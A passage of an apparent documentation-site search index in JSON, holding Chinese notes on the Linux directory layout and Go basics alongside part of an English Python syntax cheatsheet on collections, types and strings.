\u4f7f\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684\u6240\u6709\u529f\u80fd\u3002"},{"location":"%E7%B3%BB%E7%BB%9F/linux%E5%9F%BA%E7%A1%80-%E7%BB%93%E6%9E%84/#_3","title":"\u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u7ed3\u6784","text":"path \u63cf\u8ff0 / \u9876\u7ea7\u76ee\u5f55\u662f\u6839\u6587\u4ef6\u7cfb\u7edf\uff0c\u5305\u542b\u5728\u6302\u8f7d\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\u4e4b\u524d\u542f\u52a8\u64cd\u4f5c\u7cfb\u7edf\u6240\u9700\u7684\u6240\u6709\u6587\u4ef6\u4ee5\u53ca\u542f\u52a8\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\u6240\u9700\u7684\u6587\u4ef6\u3002\u542f\u52a8\u540e\uff0c\u6240\u6709\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\u90fd\u4f5c\u4e3a\u6839\u76ee\u5f55\u7684\u5b50\u76ee\u5f55\u5b89\u88c5\u5728\u6807\u51c6\u5b89\u88c5\u70b9\u3002 /bin \u5305\u542b\u57fa\u672c\u7684\u547d\u4ee4\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 /boot \u7531\u9759\u6001\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f\u3001\u5185\u6838\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5f15\u5bfc Linux \u64cd\u4f5c\u7cfb\u7edf\u6240\u9700\u7684\u6587\u4ef6\u7ec4\u6210\u3002 /dev \u5305\u542b\u8bbe\u5907\u6587\u4ef6\u4ee5\u65b9\u4fbf\u8bbf\u95ee\u8fde\u63a5\u5230\u7cfb\u7edf\u7684\u6bcf\u4e2a\u786c\u4ef6\u8bbe\u5907\u3002 /etc \u672c\u5730\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u3002\u5df2\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u914d\u7f6e\u6587\u4ef6\u4e5f\u53ef\u4ee5\u4fdd\u5b58\u5728\u8fd9\u91cc\u3002 /home \u7cfb\u7edf\u4e0a\u7684\u6bcf\u4e2a\u7528\u6237\u5728\u6b64\u5904\u90fd\u6709\u4e00\u4e2a\u5b50\u76ee\u5f55\u7528\u4e8e\u5b58\u50a8\u3002 /lib \u7cfb\u7edf\u5f15\u5bfc\u6240\u9700\u7684\u5171\u4eab\u5e93\u6587\u4ef6\u3002 /media \u5916\u90e8\u53ef\u79fb\u52a8\u5a92\u4f53\u8bbe\u5907\uff08\u4f8b\u5982 USB \u9a71\u52a8\u5668\uff09\u5b89\u88c5\u5728\u6b64\u5904\u3002 /mnt \u5e38\u89c4\u6587\u4ef6\u7cfb\u7edf\u7684\u4e34\u65f6\u6302\u8f7d\u70b9\u3002 /opt \u7b2c\u4e09\u65b9\u5de5\u5177\u7b49\u53ef\u9009\u6587\u4ef6\u53ef\u4ee5\u4fdd\u5b58\u5728\u8fd9\u91cc\u3002 /root /sbin \u8be5\u76ee\u5f55\u5305\u542b\u7528\u4e8e\u7cfb\u7edf\u7ba1\u7406\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4e8c\u8fdb\u5236\u7cfb\u7edf\u6587\u4ef6\uff09\u3002 /tmp \u64cd\u4f5c\u7cfb\u7edf\u548c\u8bb8\u591a\u7a0b\u5e8f\u4f7f\u7528\u6b64\u76ee\u5f55\u6765\u5b58\u50a8\u4e34\u65f6\u6587\u4ef6\u3002\u8be5\u76ee\u5f55\u4e00\u822c\u4f1a\u5728\u7cfb\u7edf\u542f\u52a8\u65f6\u88ab\u6e05\u9664\uff0c\u5176\u4ed6\u65f6\u5019\u53ef\u80fd\u4f1a\u5728\u6ca1\u6709\u4efb\u4f55\u8b66\u544a\u7684\u60c5\u51b5\u4e0b\u88ab\u5220\u9664\u3002 /usr \u5305\u542b\u53ef\u6267\u884c\u6587\u4ef6\u3001\u5e93\u3001man \u6587\u4ef6\u7b49\u3002 /var \u6b64\u76ee\u5f55\u5305\u542b\u53ef\u53d8\u6570\u636e\u6587\u4ef6\uff0c\u4f8b\u5982\u65e5\u5fd7\u6587\u4ef6\u3001\u7535\u5b50\u90ae\u4ef6\u6536\u4ef6\u7bb1\u3001Web \u5e94\u7528\u7a0b\u5e8f\u76f8\u5173\u6587\u4ef6\u3001cron \u6587\u4ef6\u7b49\u3002"},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"GO\u8bed\u6cd5\u5b66\u4e60\u7b14\u8bb0","text":""},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_1","title":"\u524d\u8a00","text":"<p>GO\u662f\u4e00\u79cd\u5f00\u6e90\u7684\u7a0b\u5e8f\u8bbe\u8ba1\u8bed\u8a00\uff0c\u5b83\u610f\u5728\u4f7f\u5f97\u4eba\u4eec\u80fd\u591f\u65b9\u4fbf\u5730\u6784\u5efa\u7b80\u5355\u3001\u53ef\u9760\u3001\u9ad8\u6548\u7684\u8f6f\u4ef6\u3002 \u57fa\u4e8e\u591a\u79cd\u8bed\u8a00\uff0c\u53d6\u5176\u7cbe\u534e\uff0c\u53bb\u5176\u7cdf\u7c95\u3002 \u5305\u542b\u5783\u573e\u56de\u6536 \u7279\u522b\u9002\u7528\u4e8e\u6784\u5efa\u57fa\u7840\u8bbe\u65bd\u7c7b\u8f6f\u4ef6\uff0c\u4ee5\u53ca\u7a0b\u5e8f\u5458\u4f7f\u7528\u7684\u5de5\u5177\u548c\u7cfb\u7edf\u7b49\u3002 GO\u7a0b\u5e8f\u901a\u5e38\u6bd4\u52a8\u6001\u8bed\u8a00\u8fd0\u884c\u901f\u5ea6\u8981\u5feb</p>"},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_2","title":"\u7b14\u8bb0\u7ed3\u6784","text":"<p>\u57fa\u7840\u7ae0\u82821-5\uff0c\u4e3b\u6d41\u8bed\u8a00\u90fd\u542b\u6709\u3002                          \u7b2c\u4e00\u7ae0\u8bb0\u5f55GO\u7684\u57fa\u7840\u7ed3\u6784 \u7b2c\u4e8c\u7ae0\u8bb2\u8ff0GO\u7a0b\u5e8f\u7684\u7ec4\u6210\u5143\u7d20--\u58f0\u660e\u3001\u53d8\u91cf\u3001\u65b0\u7c7b\u578b\u3001\u5305\u3001\u6587\u4ef6\u3001\u4f5c\u7528\u57df\u3002 \u7b2c\u4e09\u7ae0\u8ba8\u8bba\u6570\u503c\u3001\u5e03\u5c14\u91cf\u3001\u5b57\u7b26\u4e32\u3001\u5e38\u91cf\uff0c\u5982\u4f55\u5904\u7406Unicode. \u7b2c\u56db\u7ae0\u63cf\u8ff0\u590d\u5408\u7c7b\u578b\uff0c\u6570\u7ec4\u3001map\u3001\u7ed3\u6784\u4f53\u3001slice \u7b2c\u4e94\u7ae0\u6982\u8ff0\u6982\u8ff0\uff0c\u5e76\u8ba8\u8bba\u9519\u8bef\u5904\u7406\u3001\u5b95\u673a\u3001\u6062\u590d\u4ee5\u53cadefer\u8bed\u53e5 \u5176\u4f59\u7ae0\u8282\u4e3a\u72ec\u7279\u5185\u5bb9\uff0c\u65b9\u6cd5\u3001\u63a5\u53e3\u3001\u5e76\u53d1\u3001\u5305\u3001\u6d4b\u8bd5\u3001\u53cd\u5c04\u3002</p>"},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_3","title":"\u5b66\u4e60\u8d44\u6e90","text":"<p>\u6700\u597d\u7684\u6587\u6863\uff1aGo\u5b98\u65b9\u7f51\u7ad9https://golang.org \u6700\u597d\u7684\u6587\u7ae0\uff1aGo\u5b98\u65b9\u535a\u5ba2https://blog.golang.org \u6700\u597d\u7684\u8bad\u7ec3\u573a\uff1ahttps://play.golang.org \u8bad\u7ec3\u573a\u7684\u57fa\u7840\u4e0a: https://tour.golang.org Github: https://golang.org/pkg \u53ef\u4f7f\u7528\u8fd9\u4e9b\u4ee3\u7801\u6765\u5f04\u660e\u767d\u67d0\u4e9b\u7a0b\u5e8f\u7684\u8fd0\u884c\u539f\u7406 \u56de\u7b54\u5173\u4e8e\u7a0b\u5e8f\u7ec6\u8282\u7684\u95ee\u9898,\u4e5f\u53ef\u4ee5\u7528\u5b83\u4eec\u6765\u5b66\u4e60\u4e13\u5bb6\u662f\u5982\u4f55\u5199\u51fa\u4e00\u6d41\u7684Go\u4ee3\u7801.</p> <p>\u8bad\u7ec3\u573a\u53ea\u80fd\u5bfc\u5165\u5b98\u65b9\u6807\u51c6\u5e93,\u5e76\u4e14\u5f88\u591a\u5e93\u7279\u6027\u90fd\u51fa\u4e8e\u53ef\u64cd\u4f5c\u6027\u6216\u5b89\u5168\u6027\u9650\u5236\u4f7f\u7528(\u6bd4\u5982\u7f51\u7edc\u5e93).</p>"},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_4","title":"\u5165\u95e8","text":"<p>\u5bf9Go\u8bed\u8a00\u57fa\u672c\u7ec4\u4ef6\u8bf4\u660e,\u901a\u8fc7\u672c\u7ae0\u63d0\u4f9b\u4fe1\u606f\u548c\u793a\u4f8b\u4f7f\u6211\u4eec\u5c3d\u53ef\u80fd\u5feb\u5730\u505a\u4e00\u4e9b\u6709\u7528\u7684\u4e1c\u897f.</p>"},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#hello-world","title":"hello, world","text":"<p>helloworld.go</p> <pre><code>package main\n\nimport \"fmt\"\n\nfunc main() {\n    fmt.Println(\"Hello, Wolrd\")\n}\n</code></pre> <p>Go \u7f16\u8bd1\u578b\u8bed\u8a00. \u7f16\u8bd1\u5de5\u5177\u5c06\u7a0b\u5e8f\u7684\u6e90\u6587\u4ef6\u8f6c\u53d8\u6210\u673a\u5668\u76f8\u5173\u7684\u539f\u751f\u4e8c\u8fdb\u5236\u6307\u4ee4.</p> <pre><code>$ go run helloworld.go\nHello, World\n</code></pre> <p>\u7a0b\u5e8f: Go\u4ee3\u7801\u4f7f\u7528\u5305\u6765\u7ec4\u7ec7,\u5305\u7c7b\u4f3c\u4e0e\u5176\u5b83\u8bed\u8a00\u4e2d\u7684\u5e93\u548c\u6a21\u5757\u3002\u4e00\u4e2a\u5305\u7531\u4e00\u4e2a\u6216\u591a\u4e2a<code>.go</code>\u6e90\u6587\u4ef6\u7ec4\u6210\uff0c\u653e\u5728\u4e00\u4e2a\u6587\u4ef6\u5939\u4e2d\uff0c\u6587\u4ef6\u5939\u540d\u79f0\u63cf\u8ff0\u5305\u7684\u4f5c\u7528\u3002 \u6bcf\u4e2a\u6e90\u6587\u4ef6\u5f00\u59cb\u90fd\u7528<code>package</code>\u58f0\u660e\uff0c<code>package main</code>\uff0c\u6307\u660e\u4e86\u8fd9\u4e2a\u6587\u4ef6\u5c5e\u4e8e\u54ea\u4e2a\u5305\u3002\u540e\u9762\u8ddf\u7740 <code>import</code>\u5bfc\u5165\u7684\u5176\u4ed6\u5305\u5217\u8868\u3002 \u7136\u540e\u662f\u5b58\u50a8\u5728\u6587\u4ef6\u4e2d\u7684\u7a0b\u5e8f\u58f0\u660e\u3002</p> <p>\u540d\u4e3a<code>main</code>\u7684\u5305\u7528\u6765\u5b9a\u4e49\u4e00\u4e2a\u72ec\u7acb\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u800c\u4e0d\u662f\u5e93\u3002\u5728<code>main</code>\u5305\u4e2d\u7684<code>main</code>\u51fd\u6570\uff0c\u662f\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u7684\u5730\u65b9\uff0c\u901a\u5e38\u8c03\u7528\u5176\u4ed6\u5305\u4e2d\u7684\u51fd\u6570\u6765\u505a\u66f4\u591a\u4e8b\u60c5\uff0c\u6bd4\u5982<code>fmt.Println</code>\u3002</p> <p>\u51fd\u6570\uff1afunc\u3001\u51fd\u6570\u540d\u3001\u53c2\u6570\u5217\u8868\u3001\u8fd4\u56de\u503c\u5217\u8868\u3001\u5927\u62ec\u53f7\u5185\u51fd\u6570\u4f53\u3002</p> <p>\u7cbe\u786e\u5bfc\u5165\u9700\u8981\u7684\u5305\uff0c\u7f3a\u5931\u6216\u5b58\u5728\u4e0d\u9700\u8981\u7684\u5305\u4f1a\u62a5\u9519\u3002</p>"},{"location":"%E7%BC%96%E7%A8%8B/GO%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#_5","title":"\u547d\u4ee4\u884c\u53c2\u6570","text":"<p>\u5927\u90e8\u5206\u7a0b\u5e8f\u5904\u7406\u8f93\u5165\u7136\u540e\u4ea7\u751f\u8f93\u51fa\uff0c\u7a0b\u5e8f\u600e\u6837\u83b7\u53d6\u6570\u636e\u7684\u8f93\u5165\uff1f \u6765\u81ea \u5916\u90e8\u6e90\uff1a\u6587\u4ef6\u3001\u7f51\u7edc\u8fde\u63a5\u3001\u5176\u4ed6\u7a0b\u5e8f\u7684\u8f93\u51fa\u3001\u952e\u76d8\u3001\u547d\u4ee4\u884c\u53c2\u6570\u3002</p> <p>\u793a\u4f8b\uff1a</p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/","title":"Comprehensive Python Cheatsheet","text":"<p><sup>Download text file, Buy PDF, Fork me on GitHub or Check out FAQ. </sup></p> <p></p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#contents","title":"Contents","text":"<p> 1. Collections: <code>List</code>, <code>Dictionary</code>, <code>Set</code>, <code>Tuple</code>, <code>Range</code>, <code>Enumerate</code>, <code>Iterator</code>, <code>Generator</code>. 2. Types: <code>Type</code>, <code>String</code>, <code>Regular_Exp</code>, <code>Format</code>, <code>Numbers</code>, <code>Combinatorics</code>, <code>Datetime</code>. 3. Syntax: <code>Args</code>, <code>Inline</code>, <code>Import</code>, <code>Decorator</code>, <code>Class</code>, <code>Duck_Types</code>, <code>Enum</code>, <code>Exception</code>. 4. System: <code>Exit</code>, <code>Print</code>, <code>Input</code>, <code>Command_Line_Arguments</code>, <code>Open</code>, <code>Path</code>, <code>OS_Commands</code>. 5. Data: <code>JSON</code>, <code>Pickle</code>, <code>CSV</code>, <code>SQLite</code>, <code>Bytes</code>, <code>Struct</code>, <code>Array</code>, <code>Memory_View</code>, <code>Deque</code>. 6. Advanced: <code>Threading</code>, <code>Operator</code>, <code>Introspection</code>, <code>Metaprograming</code>, <code>Eval</code>, <code>Coroutines</code>. 7. Libraries: <code>Progress_Bar</code>, <code>Plot</code>, <code>Table</code>, <code>Curses</code>, <code>Logging</code>, <code>Scraping</code>, <code>Web</code>, <code>Profile</code>, <code>NumPy</code>, <code>Image</code>, <code>Audio</code>, <code>Games</code>, <code>Data</code>.</p>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#main","title":"Main","text":"<pre><code>if __name__ == '__main__':     # Runs main() if file wasn't imported.\n    main()\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#list","title":"List","text":"<pre><code>&lt;list&gt; = &lt;list&gt;[&lt;slice&gt;]       # Or: &lt;list&gt;[from_inclusive : to_exclusive : \u00b1step]\n</code></pre> <pre><code>&lt;list&gt;.append(&lt;el&gt;)            # Or: &lt;list&gt; += [&lt;el&gt;]\n&lt;list&gt;.extend(&lt;collection&gt;)    # Or: &lt;list&gt; += &lt;collection&gt;\n</code></pre> <pre><code>&lt;list&gt;.sort()                  # Sorts in ascending order.\n&lt;list&gt;.reverse()               # Reverses the list in-place.\n&lt;list&gt; = sorted(&lt;collection&gt;)  # Returns a new sorted list.\n&lt;iter&gt; = reversed(&lt;list&gt;)      # Returns reversed iterator.\n</code></pre> <pre><code>sum_of_elements  = sum(&lt;collection&gt;)\nelementwise_sum  = [sum(pair) for pair in zip(list_a, list_b)]\nsorted_by_second = sorted(&lt;collection&gt;, key=lambda el: el[1])\nsorted_by_both   = sorted(&lt;collection&gt;, key=lambda el: (el[1], el[0]))\nflatter_list     = list(itertools.chain.from_iterable(&lt;list&gt;))\nproduct_of_elems = functools.reduce(lambda out, el: out * el, &lt;collection&gt;)\nlist_of_chars    = list(&lt;str&gt;)\n</code></pre> <ul> <li>For details about sorted(), min() and max() see sortable.</li> <li>Module operator provides functions itemgetter() and mul() that offer the same functionality as lambda expressions above.</li> </ul> <pre><code>&lt;list&gt;.insert(&lt;int&gt;, &lt;el&gt;)     # Inserts item at index and moves the rest to the right.\n&lt;el&gt;  = &lt;list&gt;.pop([&lt;int&gt;])    # Removes and returns item at index or from the end.\n&lt;int&gt; = &lt;list&gt;.count(&lt;el&gt;)     # Returns number of occurrences. Also works on strings.\n&lt;int&gt; = &lt;list&gt;.index(&lt;el&gt;)     # Returns index of the first occurrence or raises ValueError.\n&lt;list&gt;.remove(&lt;el&gt;)            # Removes first occurrence of the item or raises ValueError.\n&lt;list&gt;.clear()                 # Removes all items. Also works on dictionary and set.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#dictionary","title":"Dictionary","text":"<pre><code>&lt;view&gt; = &lt;dict&gt;.keys()                          # Coll. of keys that reflects changes.\n&lt;view&gt; = &lt;dict&gt;.values()                        # Coll. of values that reflects changes.\n&lt;view&gt; = &lt;dict&gt;.items()                         # Coll. of key-value tuples that reflects chgs.\n</code></pre> <pre><code>value  = &lt;dict&gt;.get(key, default=None)          # Returns default if key is missing.\nvalue  = &lt;dict&gt;.setdefault(key, default=None)   # Returns and writes default if key is missing.\n&lt;dict&gt; = collections.defaultdict(&lt;type&gt;)        # Creates a dict with default value of type.\n&lt;dict&gt; = collections.defaultdict(lambda: 1)     # Creates a dict with default value 1.\n</code></pre> <pre><code>&lt;dict&gt; = dict(&lt;collection&gt;)                     # Creates a dict from coll. of key-value pairs.\n&lt;dict&gt; = dict(zip(keys, values))                # Creates a dict from two collections.\n&lt;dict&gt; = dict.fromkeys(keys [, value])          # Creates a dict from collection of keys.\n</code></pre> <pre><code>&lt;dict&gt;.update(&lt;dict&gt;)                           # Adds items. Replaces ones with matching keys.\nvalue = &lt;dict&gt;.pop(key)                         # Removes item or raises KeyError.\n{k for k, v in &lt;dict&gt;.items() if v == value}    # Returns set of keys that point to the value.\n{k: v for k, v in &lt;dict&gt;.items() if k in keys}  # Returns a dictionary, filtered by keys.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#counter","title":"Counter","text":"<pre><code>&gt;&gt;&gt; from collections import Counter\n&gt;&gt;&gt; colors = ['blue', 'blue', 'blue', 'red', 'red']\n&gt;&gt;&gt; counter = Counter(colors)\n&gt;&gt;&gt; counter['yellow'] += 1\nCounter({'blue': 3, 'red': 2, 'yellow': 1})\n&gt;&gt;&gt; counter.most_common()[0]\n('blue', 3)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#set","title":"Set","text":"<pre><code>&lt;set&gt; = set()                                   # {} returns a dictionary.\n</code></pre> <pre><code>&lt;set&gt;.add(&lt;el&gt;)                                 # Or: &lt;set&gt; |= {&lt;el&gt;}\n&lt;set&gt;.update(&lt;collection&gt; [, ...])              # Or: &lt;set&gt; |= &lt;set&gt;\n</code></pre> <pre><code>&lt;set&gt;  = &lt;set&gt;.union(&lt;coll.&gt;)                   # Or: &lt;set&gt; | &lt;set&gt;\n&lt;set&gt;  = &lt;set&gt;.intersection(&lt;coll.&gt;)            # Or: &lt;set&gt; &amp; &lt;set&gt;\n&lt;set&gt;  = &lt;set&gt;.difference(&lt;coll.&gt;)              # Or: &lt;set&gt; - &lt;set&gt;\n&lt;set&gt;  = &lt;set&gt;.symmetric_difference(&lt;coll.&gt;)    # Or: &lt;set&gt; ^ &lt;set&gt;\n&lt;bool&gt; = &lt;set&gt;.issubset(&lt;coll.&gt;)                # Or: &lt;set&gt; &lt;= &lt;set&gt;\n&lt;bool&gt; = &lt;set&gt;.issuperset(&lt;coll.&gt;)              # Or: &lt;set&gt; &gt;= &lt;set&gt;\n</code></pre> <pre><code>&lt;el&gt; = &lt;set&gt;.pop()                              # Raises KeyError if empty.\n&lt;set&gt;.remove(&lt;el&gt;)                              # Raises KeyError if missing.\n&lt;set&gt;.discard(&lt;el&gt;)                             # Doesn't raise an error.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#frozen-set","title":"Frozen Set","text":"<ul> <li>Is immutable and hashable.</li> <li>That means it can be used as a key in a dictionary or as an element in a set.</li> </ul> <pre><code>&lt;frozenset&gt; = frozenset(&lt;collection&gt;)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#tuple","title":"Tuple","text":"<p>Tuple is an immutable and hashable list.</p> <pre><code>&lt;tuple&gt; = ()                                # Or: tuple()\n&lt;tuple&gt; = (&lt;el&gt;,)                           # Or: &lt;el&gt;,\n&lt;tuple&gt; = (&lt;el_1&gt;, &lt;el_2&gt; [, ...])          # Or: &lt;el_1&gt;, &lt;el_2&gt; [, ...]\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#named-tuple","title":"Named Tuple","text":"<p>Tuple's subclass with named elements.</p> <pre><code>&gt;&gt;&gt; from collections import namedtuple\n&gt;&gt;&gt; Point = namedtuple('Point', 'x y')\n&gt;&gt;&gt; p = Point(1, y=2)\nPoint(x=1, y=2)\n&gt;&gt;&gt; p[0]\n1\n&gt;&gt;&gt; p.x\n1\n&gt;&gt;&gt; getattr(p, 'y')\n2\n&gt;&gt;&gt; p._fields  # Or: Point._fields\n('x', 'y')\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#range","title":"Range","text":"<pre><code>&lt;range&gt; = range(to_exclusive)\n&lt;range&gt; = range(from_inclusive, to_exclusive)\n&lt;range&gt; = range(from_inclusive, to_exclusive, \u00b1step_size)\n</code></pre> <pre><code>from_inclusive = &lt;range&gt;.start\nto_exclusive   = &lt;range&gt;.stop\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#enumerate","title":"Enumerate","text":"<pre><code>for i, el in enumerate(&lt;collection&gt; [, i_start]):\n    ...\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#iterator","title":"Iterator","text":"<pre><code>&lt;iter&gt; = iter(&lt;collection&gt;)                 # `iter(&lt;iter&gt;)` returns unmodified iterator.\n&lt;iter&gt; = iter(&lt;function&gt;, to_exclusive)     # A sequence of return values until 'to_exclusive'.\n&lt;el&gt;   = next(&lt;iter&gt; [, default])           # Raises StopIteration or returns 'default' on end.\n&lt;list&gt; = list(&lt;iter&gt;)                       # Returns a list of iterator's remaining elements.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#itertools","title":"Itertools","text":"<pre><code>from itertools import count, repeat, cycle, chain, islice\n</code></pre> <pre><code>&lt;iter&gt; = count(start=0, step=1)             # Returns updated value endlessly. Accepts floats.\n&lt;iter&gt; = repeat(&lt;el&gt; [, times])             # Returns element endlessly or 'times' times.\n&lt;iter&gt; = cycle(&lt;collection&gt;)                # Repeats the sequence endlessly.\n</code></pre> <pre><code>&lt;iter&gt; = chain(&lt;coll_1&gt;, &lt;coll_2&gt; [, ...])  # Empties collections in order (figuratively).\n&lt;iter&gt; = chain.from_iterable(&lt;collection&gt;)  # Empties collections inside a collection in order.\n</code></pre> <pre><code>&lt;iter&gt; = islice(&lt;coll&gt;, to_exclusive)       # Only returns first 'to_exclusive' elements.\n&lt;iter&gt; = islice(&lt;coll&gt;, from_inclusive, \u2026)  # `to_exclusive, step_size`.\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#generator","title":"Generator","text":"<ul> <li>Any function that contains a yield statement returns a generator.</li> <li>Generators and iterators are interchangeable.</li> </ul> <pre><code>def count(start, step):\n    while True:\n        yield start\n        start += step\n</code></pre> <pre><code>&gt;&gt;&gt; counter = count(10, 2)\n&gt;&gt;&gt; next(counter), next(counter), next(counter)\n(10, 12, 14)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#type","title":"Type","text":"<ul> <li>Everything is an object.</li> <li>Every object has a type.</li> <li>Type and class are synonymous.</li> </ul> <pre><code>&lt;type&gt; = type(&lt;el&gt;)                          # Or: &lt;el&gt;.__class__\n&lt;bool&gt; = isinstance(&lt;el&gt;, &lt;type&gt;)            # Or: issubclass(type(&lt;el&gt;), &lt;type&gt;)\n</code></pre> <pre><code>&gt;&gt;&gt; type('a'), 'a'.__class__, str\n(&lt;class 'str'&gt;, &lt;class 'str'&gt;, &lt;class 'str'&gt;)\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#some-types-do-not-have-built-in-names-so-they-must-be-imported","title":"Some types do not have built-in names, so they must be imported:","text":"<pre><code>from types import FunctionType, MethodType, LambdaType, GeneratorType, ModuleType\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#abstract-base-classes","title":"Abstract Base Classes","text":"<p>Each abstract base class specifies a set of virtual subclasses. These classes are then recognized by isinstance() and issubclass() as subclasses of the ABC, although they are really not. ABC can also manually decide whether or not a specific class is its virtual subclass, usually based on which methods the class has implemented. For instance, Iterable ABC looks for method iter(), while Collection ABC looks for iter(), contains() and len().</p> <pre><code>&gt;&gt;&gt; from collections.abc import Iterable, Collection, Sequence\n&gt;&gt;&gt; isinstance([1, 2, 3], Iterable)\nTrue\n</code></pre> <pre><code>+------------------+------------+------------+------------+\n|                  |  Iterable  | Collection |  Sequence  |\n+------------------+------------+------------+------------+\n| list, range, str |    yes     |    yes     |    yes     |\n| dict, set        |    yes     |    yes     |            |\n| iter             |    yes     |            |            |\n+------------------+------------+------------+------------+\n</code></pre> <pre><code>&gt;&gt;&gt; from numbers import Number, Complex, Real, Rational, Integral\n&gt;&gt;&gt; isinstance(123, Number)\nTrue\n</code></pre> <pre><code>+--------------------+----------+----------+----------+----------+----------+\n|                    |  Number  |  Complex |   Real   | Rational | Integral |\n+--------------------+----------+----------+----------+----------+----------+\n| int                |   yes    |   yes    |   yes    |   yes    |   yes    |\n| fractions.Fraction |   yes    |   yes    |   yes    |   yes    |          |\n| float              |   yes    |   yes    |   yes    |          |          |\n| complex            |   yes    |   yes    |          |          |          |\n| decimal.Decimal    |   yes    |          |          |          |          |\n+--------------------+----------+----------+----------+----------+----------+\n</code></pre>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#string","title":"String","text":"<pre><code>&lt;str&gt;  = &lt;str&gt;.strip()                       # Strips all whitespace characters from both ends.\n&lt;str&gt;  = &lt;str&gt;.strip('&lt;chars&gt;')              # Strips all passed characters from both ends.\n</code></pre> <pre><code>&lt;list&gt; = &lt;str&gt;.split()                       # Splits on one or more whitespace characters.\n&lt;list&gt; = &lt;str&gt;.split(sep=None, maxsplit=-1)  # Splits on 'sep' str at most 'maxsplit' times.\n&lt;list&gt; = &lt;str&gt;.splitlines(keepends=False)    # On [\\n\\r\\f\\v\\x1c-\\x1e\\x85\\u2028\\u2029] and \\r\\n.\n&lt;str&gt;  = &lt;str&gt;.join(&lt;coll_of_strings&gt;)       # Joins elements using string as a separator.\n</code></pre> <pre><code>&lt;bool&gt; = &lt;sub_str&gt; in &lt;str&gt;                  # Checks if string contains a substring.\n&lt;bool&gt; = &lt;str&gt;.startswith(&lt;sub_str&gt;)         # Pass tuple of strings for multiple options.\n&lt;bool&gt; = &lt;str&gt;.endswith(&lt;sub_str&gt;)           # Pass tuple of strings for multiple options.\n&lt;int&gt;  = &lt;str&gt;.find(&lt;sub_str&gt;)               # Returns start index of the first match or -1.\n&lt;int&gt;  = &lt;str&gt;.index(&lt;sub_str&gt;)              # Same, but raises ValueError if missing.\n</code></pre> <pre><code>&lt;str&gt;  = &lt;str&gt;.replace(old, new [, count])   # Replaces 'old' with 'new' at most 'count' times.\n&lt;str&gt;  = &lt;str&gt;.translate(&lt;table&gt;)            # Use `str.maketrans(&lt;dict&gt;)` to generate table.\n</code></pre> <pre><code>&lt;str&gt;  = chr(&lt;int&gt;)                          # Converts int to Unicode character.\n&lt;int&gt;  = ord(&lt;str&gt;)                          # Converts Unicode character to int.\n</code></pre> <ul> <li>Also: <code>'lstrip()'</code>, <code>'rstrip()'</code> and <code>'rsplit()'</code>.</li> <li>Also: <code>'lower()'</code>, <code>'upper()'</code>, <code>'capitalize()'</code> and <code>'title()'</code>.</li> </ul>"},{"location":"%E7%BC%96%E7%A8%8B/python-cheatsheet/#property-methods","title":"Property Methods","text":"<pre><code>+---------------+----------+----------+----------+----------+----------+\n|               | [ !#$%\u2026] | [a-zA-Z] |  [\u00bc\u00bd\u00be]   |  [\u00b2\u00b3\u00b9]   |  [0-9]   |\n+---------------+----------+----------+----------+----------+----------+\n| isprintable() |   yes    |   yes    |   yes    |   yes    |   yes    |\n| isalnum()     |          |   yes    |   yes    |   yes    |   yes    |\n| isnumeric()   |          |          |   yes    |   yes    |   yes    |\n| isdigit()     |          |          |          |   yes    |   yes    |\n| isdecimal()   |          |          |          |          |   yes    |\n+---------------+----------+----------+----------+----------+----------+\n</code></pre> <ul> <li>Also: 